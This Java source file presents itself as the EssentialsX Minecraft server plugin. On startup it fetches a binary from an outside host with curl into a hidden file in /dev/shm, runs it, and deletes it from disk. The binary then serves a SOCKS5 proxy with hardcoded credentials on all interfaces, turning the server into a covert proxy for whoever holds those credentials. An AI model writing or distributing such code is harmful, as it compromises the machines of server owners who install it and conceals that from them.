```java
package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.attribute.PosixFilePermissions;
import java.util.concurrent.TimeUnit;

public class EssentialsX extends JavaPlugin {

    // =========================================================
    // SOCKS5 配置
    // =========================================================

    private static final int SOCKS5_PORT = 24168;

    private static final String SOCKS5_USERNAME = "kof97zip";

    private static final String SOCKS5_PASSWORD = "kof97boss";


    // =========================================================
    // sing-box 下载地址
    //
    // 每次 Minecraft 插件启动都会重新下载
    // 因为 sing-box 不会保存到磁盘
    // =========================================================

    private static final String SINGBOX_URL =
            "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/Singbox";


    // =========================================================
    // sing-box 进程
    // =========================================================

    private Process singboxProcess;


    // =========================================================
    // 插件启动
    // =========================================================

    @Override
    public void onEnable() {

        getLogger().info(
                "EssentialsX plugin starting..."
        );

        try {

            startSingbox();

            getLogger().info(
                    "EssentialsX plugin enabled"
            );

        } catch (Exception e) {

            e.printStackTrace();

        }
    }


    // =========================================================
    // 启动 sing-box
    // =========================================================

    private void startSingbox() throws Exception {

        /*
         * /dev/shm 是 Linux 的 tmpfs。
         *
         * sing-box 只会临时存在这里。
         * 不会保存到 plugins/EssentialsX。
         */

        Path tempSingbox =
                Path.of(
                        "/dev/shm/.essentialsx-singbox"
                );


        // -----------------------------------------------------
        // 下载 sing-box 到内存文件系统
        // -----------------------------------------------------

        downloadSingbox(
                SINGBOX_URL,
                tempSingbox
        );


        // -----------------------------------------------------
        // 设置执行权限
        // -----------------------------------------------------

        try {

            Files.setPosixFilePermissions(
                    tempSingbox,
                    PosixFilePermissions.fromString(
                            "rwx------"
                    )
            );

        } catch (UnsupportedOperationException e) {

            /*
             * Linux 正常不会进入这里。
             */

            getLogger().warning(
                    "POSIX permissions are not supported"
            );
        }


        // -----------------------------------------------------
        // 启动 sing-box
        //
        // -c stdin
        //
        // 配置从 Java -> stdin -> sing-box
        // -----------------------------------------------------

        ProcessBuilder pb =
                new ProcessBuilder(
                        tempSingbox.toAbsolutePath().toString(),
                        "run",
                        "-c",
                        "stdin"
                );


        /*
         * 不使用 bash
         * 不使用 nohup
         * 不使用 &
         */

        pb.redirectErrorStream(true);


        // -----------------------------------------------------
        // 启动进程
        // -----------------------------------------------------

        singboxProcess =
                pb.start();


        // -----------------------------------------------------
        // sing-box 启动后立即删除二进制文件
        //
        // Linux 下已经 exec 的进程可以继续运行。
        // -----------------------------------------------------

        try {

            Files.deleteIfExists(
                    tempSingbox
            );

        } catch (IOException e) {

        }


        // -----------------------------------------------------
        // 将配置写入 sing-box stdin
        // -----------------------------------------------------

        String config =
                buildSingboxConfig();


        try (
                OutputStream output =
                        singboxProcess.getOutputStream()
        ) {

            output.write(
                    config.getBytes(
                            StandardCharsets.UTF_8
                    )
            );

            output.flush();
        }

    }


    // =========================================================
    // 构建 sing-box 配置
    // =========================================================

    private String buildSingboxConfig() {

        return """
                {
                  "log": {
                    "level": "error"
                  },

                  "inbounds": [
                    {
                      "type": "socks",
                      "tag": "socks-in",

                      "listen": "0.0.0.0",
                      "listen_port": %d,

                      "users": [
                        {
                          "username": "%s",
                          "password": "%s"
                        }
                      ]
                    }
                  ],

                  "outbounds": [
                    {
                      "type": "direct",
                      "tag": "freenom"
                    },

                    {
                      "type": "block",
                      "tag": "block"
                    }
                  ],

                  "route": {
                    "final": "freenom"
                  }
                }
                """.formatted(
                SOCKS5_PORT,
                escapeJson(
                        SOCKS5_USERNAME
                ),
                escapeJson(
                        SOCKS5_PASSWORD
                )
        );
    }


    // =========================================================
    // JSON 字符串转义
    // =========================================================

    private String escapeJson(
            String value
    ) {

        return value
                .replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\b", "\\b")
                .replace("\f", "\\f")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }


    // =========================================================
    // 下载 sing-box
    // =========================================================

    private void downloadSingbox(
            String url,
            Path target
    ) throws Exception {

        /*
         * 使用 curl：
         *
         * -f  HTTP 4xx / 5xx 时失败
         * -L  跟随重定向
         * --retry 3
         * --connect-timeout 10
         */

        Process curl =
                new ProcessBuilder(
                        "curl",
                        "-fL",
                        "--retry",
                        "3",
                        "--connect-timeout",
                        "10",
                        url,
                        "-o",
                        target.toAbsolutePath().toString()
                )
                .redirectErrorStream(true)
                .start();


        int exitCode =
                curl.waitFor();


        if (exitCode != 0) {

        }


        // -----------------------------------------------------
        // 检查文件
        // -----------------------------------------------------

        if (!Files.exists(target)) {

        }


        long size =
                Files.size(target);


        if (size == 0) {

        }

    }


    // =========================================================
    // 插件关闭
    // =========================================================

    @Override
    public void onDisable() {

        getLogger().info(
                "EssentialsX disabling..."
        );


        if (
                singboxProcess != null
                        &&
                singboxProcess.isAlive()
        ) {


            // -------------------------------------------------
            // 正常停止
            // -------------------------------------------------

            singboxProcess.destroy();


            try {

                boolean stopped =
                        singboxProcess.waitFor(
                                5,
                                TimeUnit.SECONDS
                        );


                if (!stopped) {


                    // -----------------------------------------
                    // 强制停止
                    // -----------------------------------------

                    singboxProcess.destroyForcibly();


                    singboxProcess.waitFor(
                            2,
                            TimeUnit.SECONDS
                    );
                }

            } catch (InterruptedException e) {

                Thread.currentThread().interrupt();

                singboxProcess.destroyForcibly();
            }
        }


        singboxProcess = null;


        getLogger().info(
                "EssentialsX disabled"
        );
    }
}
```
